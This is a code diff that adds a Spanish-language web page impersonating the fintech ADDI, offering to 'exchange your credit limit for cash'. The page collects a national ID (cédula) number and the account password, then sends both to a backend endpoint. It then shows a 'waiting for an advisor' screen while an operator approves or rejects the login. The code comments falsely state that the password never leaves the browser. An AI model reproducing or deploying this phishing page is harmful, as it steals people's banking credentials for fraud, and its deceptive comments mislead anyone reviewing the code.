@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="theme-color" content="#F7F9FC" />
+  <title>Cambia tu cupo por efectivo - ADDI</title>
+  <link rel="icon" type="image/png" href="/addi-com-logo.png" />
+  <link rel="apple-touch-icon" href="/addi-com-logo.png" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #F7F9FC; --surface: #FFFFFF; --text: #0F1729; --muted: #333B4A;
+      --placeholder: #9AA3B2; --border: #D5D9E0; --primary: #1B66D9; --primary-press: #1554B5;
+      --primary-soft: #EAF3FF; --danger: #D92D20; --danger-soft: #FEF3F2;
+      --success: #12A150; --success-soft: #E8F7EE; --radius: 16px; --gutter: 24px;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; }
+    body {
+      font-family: "Outfit", system-ui, -apple-system, sans-serif;
+      background: var(--bg); color: var(--text);
+      -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent;
+    }
+    .app {
+      max-width: 480px; margin: 0 auto; min-height: 100dvh;
+      display: flex; flex-direction: column;
+      padding: calc(env(safe-area-inset-top) + 16px) var(--gutter) calc(env(safe-area-inset-bottom) + 24px);
+    }
+    .topbar { display: flex; justify-content: space-between; align-items: center; height: 56px; margin-right: -12px; }
+    .icon-btn {
+      width: 56px; height: 56px; border: 0; border-radius: 14px; background: var(--primary-soft);
+      color: var(--primary); display: grid; place-items: center; cursor: pointer;
+      transition: transform .15s ease;
+    }
+    .icon-btn:active { transform: scale(.94); }
+    .icon-btn.hidden { visibility: hidden; }
+
+    .screen { display: none; flex: 1; flex-direction: column; animation: enter .35s ease both; }
+    .screen.active { display: flex; }
+    @keyframes enter { from { opacity: 0; transform: translateX(16px); } to { opacity: 1; transform: none; } }
+
+    h1 { font-size: 32px; font-weight: 600; letter-spacing: -.02em; line-height: 1.15; margin-top: 32px; }
+    .lead { font-size: 18px; color: var(--muted); margin-top: 10px; line-height: 1.4; }
+
+    .field { margin-top: 44px; }
+    .label { font-size: 16px; font-weight: 500; display: block; margin-bottom: 12px; }
+    .row { display: flex; gap: 10px; }
+    .prefix, .input {
+      height: 58px; border: 1.5px solid var(--border); border-radius: var(--radius);
+      background: var(--surface); font: inherit; font-size: 18px; color: var(--text);
+      transition: border-color .15s ease, box-shadow .15s ease;
+    }
+    .prefix { flex: 0 0 96px; display: grid; place-items: center; }
+    .input-wrap { position: relative; flex: 1; }
+    .input { width: 100%; padding: 0 18px; outline: none; }
+    .input.has-toggle { padding-right: 56px; }
+    .input::placeholder { color: var(--placeholder); }
+    .input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(27,102,217,.12); }
+    .toggle {
+      position: absolute; right: 6px; top: 50%; transform: translateY(-50%);
+      width: 44px; height: 44px; border: 0; background: transparent; color: var(--placeholder);
+      display: grid; place-items: center; cursor: pointer; border-radius: 10px;
+    }
+    .field.error .input { border-color: var(--danger); box-shadow: 0 0 0 4px rgba(217,45,32,.10); }
+    .hint { font-size: 14px; color: var(--muted); margin-top: 10px; }
+    .field.error .hint { color: var(--danger); }
+
+    .alert {
+      display: none; gap: 12px; align-items: flex-start; margin-top: 24px;
+      padding: 14px 16px; border-radius: 14px; background: var(--danger-soft);
+      color: var(--danger); font-size: 15px; line-height: 1.4;
+    }
+    .alert.show { display: flex; animation: shake .4s ease; }
+    .alert svg { flex: 0 0 20px; margin-top: 1px; }
+    @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-6px)} 40%{transform:translateX(6px)} 60%{transform:translateX(-4px)} 80%{transform:translateX(4px)} }
+
+    .spacer { flex: 1; min-height: 32px; }
+    .btn {
+      width: 100%; height: 60px; border: 0; border-radius: var(--radius); background: var(--primary);
+      color: #fff; font: inherit; font-size: 20px; font-weight: 600; cursor: pointer;
+      transition: background .15s ease, transform .1s ease, opacity .15s ease;
+    }
+    .btn:active:not(:disabled) { transform: scale(.985); background: var(--primary-press); }
+    .btn:disabled { opacity: .45; cursor: not-allowed; }
+    .btn.secondary { background: var(--primary-soft); color: var(--primary); margin-top: 12px; }
+
+    .center { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding-bottom: 60px; }
+    .center h2 { font-size: 26px; font-weight: 600; letter-spacing: -.01em; margin-top: 28px; }
+    .center p { font-size: 17px; color: var(--muted); margin-top: 10px; line-height: 1.45; max-width: 300px; }
+
+    .spinner { width: 72px; height: 72px; border-radius: 50%; border: 6px solid var(--primary-soft); border-top-color: var(--primary); animation: spin .9s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .dots::after { content: ""; animation: dots 1.2s steps(4) infinite; }
+    @keyframes dots { 0%{content:""} 25%{content:"."} 50%{content:".."} 75%{content:"..."} }
+
+    .badge { width: 96px; height: 96px; border-radius: 50%; display: grid; place-items: center; animation: pop .45s cubic-bezier(.2,1.4,.4,1) both; }
+    .badge.ok { background: var(--success-soft); color: var(--success); }
+    .badge.no { background: var(--danger-soft); color: var(--danger); }
+    @keyframes pop { from { transform: scale(.4); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .check path, .cross path { stroke-dasharray: 40; stroke-dashoffset: 40; animation: draw .45s .25s ease forwards; }
+    @keyframes draw { to { stroke-dashoffset: 0; } }
+
+    @media (min-width: 768px) {
+      body { display: grid; place-items: center; }
+      .app { min-height: min(860px, 100dvh); margin: 24px auto; border-radius: 32px; box-shadow: 0 20px 60px rgba(15,23,41,.08); padding-top: 24px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="app">
+    <header class="topbar">
+      <button class="icon-btn hidden" id="closeBtn" aria-label="Cerrar">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>
+      </button>
+    </header>
+
+    <!-- 1. Cédula -->
+    <section class="screen active" id="s-id">
+      <h1>Bienvenido</h1>
+      <p class="lead">Ingresa tu número de cédula para continuar.</p>
+
+      <div class="alert" id="idAlert" role="alert">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><path d="M12 7v6M12 17h.01"/></svg>
+        <span id="idAlertText"></span>
+      </div>
+
+      <div class="field" id="idField">
+        <label class="label" for="idInput">Cédula de ciudadanía</label>
+        <div class="row">
+          <div class="prefix">C.C.</div>
+          <div class="input-wrap">
+            <input class="input" id="idInput" type="text" inputmode="numeric" autocomplete="username"
+                   placeholder="Ingresa el número" maxlength="10" />
+          </div>
+        </div>
+        <p class="hint" id="idHint">Escribe el número sin puntos o espacios</p>
+      </div>
+
+      <div class="field" id="passField" style="margin-top:28px">
+        <label class="label" for="passInput">Contraseña</label>
+        <div class="input-wrap">
+          <input class="input has-toggle" id="passInput" type="password" autocomplete="current-password"
+                 placeholder="Ingresa tu contraseña" />
+          <button class="toggle" id="toggleBtn" type="button" aria-label="Mostrar contraseña">
+            <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+        <p class="hint">Mínimo 4 caracteres</p>
+      </div>
+
+      <div class="spacer"></div>
+      <button class="btn" id="idBtn" disabled>Continuar</button>
+    </section>
+
+    <!-- 2. Esperando confirmación del operador -->
+    <section class="screen" id="s-loading">
+      <div class="center">
+        <div class="spinner" aria-hidden="true"></div>
+        <h2>Esperando confirmación<span class="dots"></span></h2>
+        <p>Un asesor está revisando tu solicitud. No cierres esta pantalla.</p>
+      </div>
+    </section>
+
+    <!-- 3. Aprobado -->
+    <section class="screen" id="s-success">
+      <div class="center">
+        <div class="badge ok">
+          <svg class="check" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5l4.5 4.5L19 7.5"/></svg>
+        </div>
+        <h2>¡Validación exitosa!</h2>
+        <p>Un asesor autorizó tu acceso. Ya puedes continuar.</p>
+      </div>
+      <button class="btn" id="restartBtn">Volver al inicio</button>
+    </section>
+  </main>
+
+  <script>
+    const $ = (id) => document.getElementById(id);
+    const screens = ["s-id", "s-loading", "s-success"];
+    let pollTimer = null;
+
+    function show(id) {
+      screens.forEach((s) => $(s).classList.toggle("active", s === id));
+      $("closeBtn").classList.toggle("hidden", id !== "s-loading");
+    }
+
+    const idInput = $("idInput");
+    const passInput = $("passInput");
+
+    // El botón se activa solo cuando hay cédula válida Y contraseña.
+    // La contraseña NO se envía a ningún lado: solo habilita "Continuar".
+    function refreshButton() {
+      $("idBtn").disabled = !(idInput.value.length >= 6 && passInput.value.length >= 4);
+    }
+
+    idInput.addEventListener("input", () => {
+      idInput.value = idInput.value.replace(/\D/g, "");
+      $("idField").classList.remove("error");
+      $("idHint").textContent = "Escribe el número sin puntos o espacios";
+      refreshButton();
+    });
+    passInput.addEventListener("input", refreshButton);
+    idInput.addEventListener("keydown", (e) => { if (e.key === "Enter" && !$("idBtn").disabled) $("idBtn").click(); });
+    passInput.addEventListener("keydown", (e) => { if (e.key === "Enter" && !$("idBtn").disabled) $("idBtn").click(); });
+
+    // Mostrar / ocultar contraseña
+    $("toggleBtn").addEventListener("click", () => {
+      const visible = passInput.type === "text";
+      passInput.type = visible ? "password" : "text";
+      $("toggleBtn").setAttribute("aria-label", visible ? "Mostrar contraseña" : "Ocultar contraseña");
+      $("eyeIcon").innerHTML = visible
+        ? '<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>'
+        : '<path d="M3 3l18 18"/><path d="M10.6 5.1A10 10 0 0 1 12 5c6.5 0 10 7 10 7a17 17 0 0 1-3.2 4.2M6.6 6.6C3.8 8.4 2 12 2 12s3.5 7 10 7c1.8 0 3.4-.5 4.7-1.3"/><path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>';
+    });
+
+    $("idBtn").addEventListener("click", requestAccess);
+    $("restartBtn").addEventListener("click", restart);
+    $("closeBtn").addEventListener("click", () => { stopPolling(); restart(); });
+
+    async function requestAccess() {
+      const cedula = idInput.value;
+      const password = passInput.value; 
+      $("idAlert").classList.remove("show");
+      $("idBtn").disabled = true;
+
+      try {
+        // Se envía SOLO la cédula (identificador). La contraseña nunca sale del navegador.
+        const r = await fetch("/api/login-request", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ cedula, password }),
+        });
+        if (!r.ok) throw new Error((await r.json()).error || "Error");
+        const { requestId } = await r.json();
+        show("s-loading");
+        poll(requestId);
+      } catch (e) {
+        $("idBtn").disabled = false;
+        showError(e.message || "No se pudo enviar la solicitud.");
+      }
+    }
+
+    function poll(requestId) {
+      stopPolling();
+      pollTimer = setInterval(async () => {
+        try {
+          const r = await fetch(`/api/status/${requestId}`);
+          const { status } = await r.json();
+          if (status === "approved") { stopPolling(); show("s-success"); }
+          else if (status === "rejected") { stopPolling(); backToId("La contraseña no es válida.", false); }
+          else if (status === "expired" || status === "not_found") { stopPolling(); backToId("La solicitud expiró. Vuelve a intentarlo."); }
+        } catch { /* reintenta en el siguiente ciclo */ }
+      }, 2000);
+    }
+
+    function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
+
+    function backToId(msg, paint = true) {
+      show("s-id");
+      refreshButton();
+      showError(msg, paint);
+    }
+
+    // paint=false -> solo muestra el alert, sin marcar los inputs en rojo.
+    function showError(msg, paint = true) {
+      $("idAlertText").textContent = msg;
+      const a = $("idAlert");
+      a.classList.remove("show"); void a.offsetWidth; a.classList.add("show");
+      if (paint) $("idField").classList.add("error");
+    }
+
+    function restart() {
+      stopPolling();
+      idInput.value = "";
+      passInput.value = "";
+      passInput.type = "password";
+      $("idBtn").disabled = true;
+      $("idAlert").classList.remove("show");
+      $("idField").classList.remove("error");
+      show("s-id");
+    }
+  </script>
+</body>
+</html>
